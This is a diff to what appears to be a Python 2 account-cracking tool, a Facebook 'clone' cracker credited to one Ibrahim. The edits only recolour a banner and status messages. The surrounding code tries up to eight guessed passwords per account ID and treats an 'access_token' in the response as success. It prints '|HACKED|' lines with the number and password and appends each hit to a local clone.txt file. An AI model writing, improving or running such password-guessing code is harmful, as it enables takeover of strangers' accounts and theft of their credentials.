@@ -151,7 +151,7 @@ logo = """\033[92m
  _/ /    / /_/ /  / _, _/  / ___ | / __  /   _/ /    / /  / /  
 /___/   /_____/  /_/ |_|  /_/  |_|/_/ /_/   /___/   /_/  /_/
 
-\033[91m-----------------------------------------------------------
+\033[91m------------------------------------------------------------
 
 \033[92mCREADET BY IBRAHIM 
 
@@ -269,11 +269,11 @@ def action():
 
     xxx = str(len(id))
 
-    psb('[\xe2\x9c\x92] TOTAL NUMBER ' + xxx)
+    psb('\033[92m TOTAL NUMBER ' + xxx)
 
     time.sleep(0.5)
 
-    psb('[\xe2\x9c\x91] CRACK RUNNING...')
+    psb('\033[97m CRACK RUNNING...')
     
     time.sleep(0.5)
     
@@ -301,7 +301,7 @@ def action():
 
             if 'access_token' in q:
 
-                print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1
+                print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1
 
                 okb = open('anggaxd/clone.txt', 'a')
 
@@ -321,7 +321,7 @@ def action():
 
                 if 'access_token' in q:
 
-                    print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2
+                    print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2
 
                     okb = open('anggaxd/clone.txt', 'a')
 
@@ -341,7 +341,7 @@ def action():
 
                     if 'access_token' in q:
 
-                        print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
+                        print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
 
                         okb = open('anggaxd/clone.txt', 'a')
 
@@ -361,7 +361,7 @@ def action():
 
                         if 'access_token' in q:
 
-                            print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass4
+                            print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass4
 
                             okb = open('anggaxd/clone.txt', 'a')
 
@@ -401,7 +401,7 @@ def action():
 
                                 if 'access_token' in q:
 
-                                    print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass6
+                                    print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass6
 
                                     okb = open('anggaxd/clone.txt', 'a')
 
@@ -421,7 +421,7 @@ def action():
 
                                     if 'access_token' in q:
 
-                                        print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass7
+                                        print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass7
 
                                         okb = open('anggaxd/clone.txt', 'a')
 
@@ -441,7 +441,7 @@ def action():
 
                                         if 'access_token' in q:
 
-                                            print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass8
+                                            print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass8
 
                                             okb = open('anggaxd/clone.txt', 'a')
 
@@ -459,11 +459,11 @@ def action():
 
     p.map(main, id)
 
-    print '\x1b[1;92m--------------------------------------------------'
+    print '\x1b[1;91m--------------------------------------------------'
 
     print '[\xe2\x9c\x92] HACK TAWAW BW..'
 
-    print '[\xe2\x9c\x91] HAMU HACKED : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x92] HAMU HACKED : ' + str(len(oks)) + '/' + str(len(cpb))
 
     print '[\xe2\x9c\x92] SAVE BU  : anggaxd/clone.txt'
 
